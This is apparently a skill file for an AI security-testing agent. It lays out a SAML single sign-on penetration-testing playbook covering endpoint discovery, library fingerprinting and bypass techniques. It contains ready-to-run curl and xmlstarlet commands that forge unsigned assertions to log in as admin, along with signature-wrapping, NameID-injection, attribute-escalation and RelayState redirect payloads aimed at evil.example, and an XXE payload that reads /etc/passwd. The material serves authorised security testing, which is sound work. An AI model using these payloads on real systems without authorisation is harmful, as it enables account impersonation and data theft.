---
name: saml-sso-testing
description: SAML SSO security testing — assertion forgery, signature bypass, RelayState redirect, and SP/IdP trust boundary attacks
origin: AI Threat Hunting
---

# SAML SSO Security Testing

> **`aith assess kali` audit flags:** use `--technique AUTH` for all SAML auth bypass probes. Use `--probe-kind payload` for manipulation attempts, `--probe-kind exploit` for confirmed bypass demonstrations.

## When to Activate

- Target exposes SAML SP endpoints (`/saml/acs`, `/saml/metadata`, `/saml2/acs`, `/auth/saml/callback`)
- Application uses federated SSO via SAML 2.0 (enterprise apps, SaaS platforms)
- Login flow redirects to an IdP with SAMLRequest parameter
- Metadata XML references SAML namespaces (`urn:oasis:names:tc:SAML:2.0:`)
- Source analysis reveals SAML processing libraries (passport-saml, node-saml, OneLogin, py-saml2)

## Reality Check

SAML implementations fail in predictable ways. The specification is complex (~80 pages) and libraries handle edge cases inconsistently. The most common vulnerabilities in 2025:

1. **Missing signature validation** — SP accepts unsigned assertions (the library only verifies IF a signature is present, but doesn't REQUIRE one)
2. **Signature wrapping** — signed portion verified correctly, but a different unsigned assertion element is used for authentication decisions
3. **RelayState open redirect** — the post-auth redirect target is client-controlled
4. **Comment injection in NameID** — `admin<!-- comment -->@evil.example` parsed differently by XML vs string processing
5. **Certificate rollover gaps** — SP accepts any certificate during rollover windows

## Tools

- `aith assess kali exec -- curl ...` for all probing
- `xmllint` or `xmlstarlet` for XML manipulation (inside kali runtime)
- Base64 encoding/decoding for SAMLResponse manipulation
- SAML Raider (Burp extension) concepts applied manually

---

## Phase 1: SAML Endpoint Discovery

### 1.1 Find SP Endpoints

- [ ] Check for metadata endpoint: `/saml/metadata`, `/auth/saml/metadata`, `/.well-known/saml-metadata`
- [ ] Look for ACS (Assertion Consumer Service) URLs in page source or redirects
- [ ] Check login flow for SAMLRequest parameter in redirect to IdP
- [ ] Common paths: `/saml/acs`, `/saml2/acs`, `/auth/saml/callback`, `/sso/saml`, `/login/saml`
- [ ] Check `robots.txt` and sitemap for SSO-related paths

### 1.2 Extract Metadata

```bash
# Fetch SP metadata
curl https://target/saml/metadata

# Key information to extract:
# - entityID (SP identifier)
# - AssertionConsumerService URL and binding
# - Certificate (for signature verification context)
# - NameIDFormat expected
# - WantAssertionsSigned attribute (true/false/absent)
```

### 1.3 Identify SAML Library

Library identification determines which attack variants are viable:

| Indicator | Library | Known Issues |
|-----------|---------|--------------|
| `passport-saml` in npm deps | Node.js passport-saml | CVE-2022-39299 (signature bypass), comment injection |
| `node-saml` | Node.js node-saml | Historical unsigned assertion acceptance |
| `ruby-saml` | Ruby (Devise/OmniAuth) | CVE-2024-45409 (signature wrapping) |
| `python3-saml` / `py-saml2` | Python | Relaxed signature requirements in older versions |
| `spring-security-saml` | Java/Spring | Namespace confusion attacks |
| `SimpleSAMLphp` | PHP | Comment injection, XXE in metadata parsing |

---

## Phase 2: Signature Validation Testing

### 2.1 Unsigned Assertion (Most Critical — Test First)

The single most common SAML vulnerability: the SP checks signatures only when present.

**Attack procedure:**

1. Initiate a legitimate SAML login flow
2. Intercept the SAMLResponse (POST to ACS endpoint)
3. Base64-decode the response
4. Remove the `<ds:Signature>` element entirely
5. Optionally modify the NameID/attributes
6. Base64-encode and submit to the ACS endpoint

```bash
# Decode SAMLResponse
echo "$SAML_RESPONSE" | base64 -d > response.xml

# Remove Signature element
xmlstarlet ed -d "//*[local-name()='Signature']" response.xml > unsigned.xml

# Modify NameID to target user
xmlstarlet ed -u "//*[local-name()='NameID']" -v "admin@target.example" unsigned.xml > forged.xml

# Re-encode
base64 -w0 forged.xml > forged_b64.txt

# Submit
curl -X POST https://target/saml/acs \
  -d "SAMLResponse=$(cat forged_b64.txt)&RelayState=/"
```

**Expected outcomes:**
- **Vulnerable**: Login succeeds as the target user → CRITICAL finding
- **Partially vulnerable**: Login succeeds but with limited session → still HIGH
- **Not vulnerable**: Error about missing/invalid signature → properly implemented

### 2.2 Signature Wrapping Attacks (XSW1-8)

The SP verifies a signature on one element but uses a different (unsigned) element for authentication. There are 8 documented XSW variants — all templates in `agent/references/payloads/saml-attack-payloads.md` § "Signature Wrapping (XSW) Variants."

**Concept (XSW1 — forged before signed):**

```xml
<samlp:Response>
  <saml:Assertion ID="forged">  <!-- Unsigned, attacker NameID -->
    <saml:Subject><saml:NameID>admin@target.example</saml:NameID></saml:Subject>
  </saml:Assertion>
  <saml:Assertion ID="genuine">  <!-- Signed, original NameID -->
    <ds:Signature><ds:Reference URI="#genuine"/></ds:Signature>
    <saml:Subject><saml:NameID>user@target.example</saml:NameID></saml:Subject>
  </saml:Assertion>
</samlp:Response>
```

**Key insight**: The signature validates over the signed element's subtree. If the SP uses XPath to find the NameID and picks the first match (the forged one), authentication is bypassed. Test all 8 variants from the reference — different libraries are vulnerable to different placement strategies.

### 2.3 Certificate Acceptance Testing

- [ ] Sign assertion with a self-generated certificate → does SP accept it?
- [ ] Remove certificate from the response and sign with attacker key
- [ ] Test with expired certificate
- [ ] Test during certificate rollover (if two certs are in metadata)

---

## Phase 3: Assertion Manipulation

### 3.1 NameID Manipulation

```xml
<!-- Comment injection -->
<NameID>admin@target.example<!-- -->.evil.example</NameID>
<!-- If XML parser strips comments: "admin@target.example.evil.example" -->
<!-- If string processing sees raw: "admin@target.example" -->

<!-- Null byte injection -->
<NameID>admin@target.example%00@evil.example</NameID>

<!-- Case manipulation (if email matching is case-insensitive but IdP generates lowercase) -->
<NameID>Admin@target.example</NameID>
<NameID>ADMIN@target.example</NameID>
```

### 3.2 Attribute Manipulation

If the SP extracts role/group information from SAML attributes:

```xml
<saml:Attribute Name="role">
  <saml:AttributeValue>admin</saml:AttributeValue>
</saml:Attribute>

<saml:Attribute Name="groups">
  <saml:AttributeValue>Domain Admins</saml:AttributeValue>
</saml:Attribute>

<saml:Attribute Name="is_staff">
  <saml:AttributeValue>true</saml:AttributeValue>
</saml:Attribute>
```

### 3.3 Condition Manipulation

```xml
<!-- Extend assertion validity -->
<Conditions NotBefore="2020-01-01T00:00:00Z" NotOnOrAfter="2030-12-31T23:59:59Z">

<!-- Remove audience restriction -->
<!-- Delete <AudienceRestriction> element entirely -->

<!-- Change audience to match a different SP -->
<Audience>https://other-sp.target.example</Audience>
```

### 3.4 Replay Attack

- [ ] Capture a valid SAMLResponse
- [ ] Submit it again after the session is established (should fail due to InResponseTo / one-time-use)
- [ ] Submit it from a different IP or browser
- [ ] Submit after the NotOnOrAfter time has passed

---

## Phase 4: RelayState / Redirect Testing

### 4.1 Open Redirect via RelayState

RelayState is the post-authentication redirect target. If not validated:

```bash
# Test open redirect
curl -X POST https://target/saml/acs \
  -d "SAMLResponse=$VALID_RESPONSE&RelayState=https://evil.example"

# Protocol-relative
curl -X POST https://target/saml/acs \
  -d "SAMLResponse=$VALID_RESPONSE&RelayState=//evil.example"

# JavaScript URI (if RelayState is used in a Location header)
curl -X POST https://target/saml/acs \
  -d "SAMLResponse=$VALID_RESPONSE&RelayState=javascript:alert(1)"

# URL-encoded bypass
curl -X POST https://target/saml/acs \
  -d "SAMLResponse=$VALID_RESPONSE&RelayState=https://target.example@evil.example"
```

### 4.2 RelayState for Token Theft

If the application includes auth tokens in the redirect after SAML:

```bash
# If post-auth redirect includes token in URL:
# https://target/callback?token=JWT_HERE&RelayState=https://evil.example
# The token leaks via Referer header to evil.example
```

---

## Phase 5: XXE via SAML

SAML messages are XML. If the SP parses with external entity resolution enabled:

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<samlp:Response>
  <saml:Assertion>
    <saml:Subject>
      <saml:NameID>&xxe;</saml:NameID>
    </saml:Subject>
  </saml:Assertion>
</samlp:Response>
```

Also test XXE in metadata parsing if the SP fetches metadata from a URL you control.

---

## What to Record

- SAML endpoint (ACS URL) and the specific manipulation that succeeded
- Whether the SP requires signatures, validates them correctly, or accepts unsigned assertions
- The forged assertion content and the resulting authenticated session
- Attacker outcome: which user was impersonated, what data/actions were accessible
- Proof of authentication: show the session cookie/token received and a subsequent authenticated request
- Severity:
  - **Critical**: Unsigned assertion accepted → arbitrary user impersonation
  - **Critical**: Signature wrapping → same impact as unsigned
  - **High**: Certificate validation bypass → forgery with attacker-controlled cert
  - **High**: RelayState open redirect → token theft chain
  - **Medium**: Assertion replay → session fixation
  - **Medium**: Attribute injection → role escalation (if attributes drive authorization)
  - **Low**: Comment injection changing NameID format without auth impact

## Kill Signals — Stop Testing When

- Removing signature produces immediate "Invalid signature" or "Signature required" error → properly enforced
- SP pinned to specific IdP certificate and rejects all others → certificate validation working
- All wrapping variants (XSW1-8) produce signature validation errors → library handles XPath correctly
- RelayState is validated against a whitelist of internal paths → no redirect abuse

## Escalate When

- Removing `<ds:Signature>` element and submitting → still authenticates (unsigned acceptance confirmed, test with different NameID values)
- Changing NameID value in an unsigned assertion → authenticates as the target user (CRITICAL, demonstrate admin impersonation)
- RelayState accepts external URLs → test for token leakage in the redirect flow
- SP accepts self-signed certificates → forge assertions with any identity

## Extended Resources

- `agent/references/payloads/saml-attack-payloads.md` — Forged assertion templates, XSW variants, XXE payloads
